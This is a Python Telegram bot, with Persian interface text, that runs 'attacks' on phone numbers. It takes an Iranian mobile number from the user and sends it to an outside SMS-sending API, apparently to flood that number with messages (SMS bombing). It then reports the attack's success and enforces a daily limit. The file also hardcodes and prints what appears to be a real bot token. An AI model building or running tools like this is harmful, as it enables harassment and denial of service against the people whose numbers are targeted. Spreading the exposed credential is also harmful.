# -*- coding: utf-8 -*-
import telebot
from telebot import types
import requests
import threading
import time
import json
from datetime import datetime
import os

# ========== تنظیمات ==========
TOKEN = "8295266586:AAHGlLZC0Ha4-V1AOfsnJUd8xphqrVX5kBs"
ADMIN_ID = 8226091292
LIARA_API = "https://top-topye.liara.run/api/send_sms"

bot = telebot.TeleBot(TOKEN)

# ========== متغیرها ==========
user_states = {}
active_attacks = {}
user_daily = {}
DAILY_LIMIT = 5

# ========== توابع ==========
def check_daily(user_id):
    today = datetime.now().date()
    if user_id in user_daily:
        if user_daily[user_id]['date'] == today:
            return user_daily[user_id]['count'] < DAILY_LIMIT
    return True

# ========== هندلرها ==========
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('🚀 حمله جدید', '📊 وضعیت', '⛔ توقف')
    bot.reply_to(message, "🚀 ربات آماده است!", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '🚀 حمله جدید')
def new_attack(message):
    if not check_daily(message.chat.id):
        bot.reply_to(message, "⚠️ محدودیت روزانه تموم شد")
        return
    user_states[message.chat.id] = "waiting"
    bot.reply_to(message, "📱 شماره موبایل رو بفرست (مثلاً 09123456789)")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "waiting")
def get_phone(message):
    phone = message.text.strip()
    if len(phone) != 11 or not phone.startswith('09'):
        bot.reply_to(message, "❌ شماره نامعتبر")
        return
    
    del user_states[message.chat.id]
    active_attacks[message.chat.id] = True
    bot.reply_to(message, f"✅ در حال اجرا روی شماره {phone}...")
    
    threading.Thread(target=run_attack, args=(phone, message.chat.id)).start()

def run_attack(phone, chat_id):
    try:
        response = requests.post(LIARA_API, json={'phone': phone}, timeout=60)
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                result = data.get('result', {})
                bot.send_message(chat_id, f"✅ حمله انجام شد!\nموفق: {result.get('success', 0)}")
            else:
                bot.send_message(chat_id, "❌ خطا در حمله")
        else:
            bot.send_message(chat_id, f"❌ خطا: {response.status_code}")
    except Exception as e:
        bot.send_message(chat_id, f"❌ خطا: {str(e)}")
    finally:
        if chat_id in active_attacks:
            del active_attacks[chat_id]

@bot.message_handler(func=lambda m: m.text == '📊 وضعیت')
def status(message):
    if message.chat.id in active_attacks:
        bot.reply_to(message, "⚠️ حمله در حال انجام")
    else:
        bot.reply_to(message, "✅ آماده برای حمله جدید")

@bot.message_handler(func=lambda m: m.text == '⛔ توقف')
def stop(message):
    if message.chat.id in active_attacks:
        active_attacks[message.chat.id] = False
        bot.reply_to(message, "⛔ حمله متوقف شد")
    else:
        bot.reply_to(message, "❌ حمله فعالی نیست")

@bot.message_handler(func=lambda m: True)
def fallback(message):
    bot.reply_to(message, "⚠️ لطفاً از دکمه‌ها استفاده کن")

# ========== اجرا ==========
if __name__ == "__main__":
    print("🤖 ربات راه‌اندازی شد")
    print(f"توکن: {TOKEN}")
    print("در حال گوش دادن به پیام‌ها...")
    
    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            print(f"خطا: {e}")
            time.sleep(5)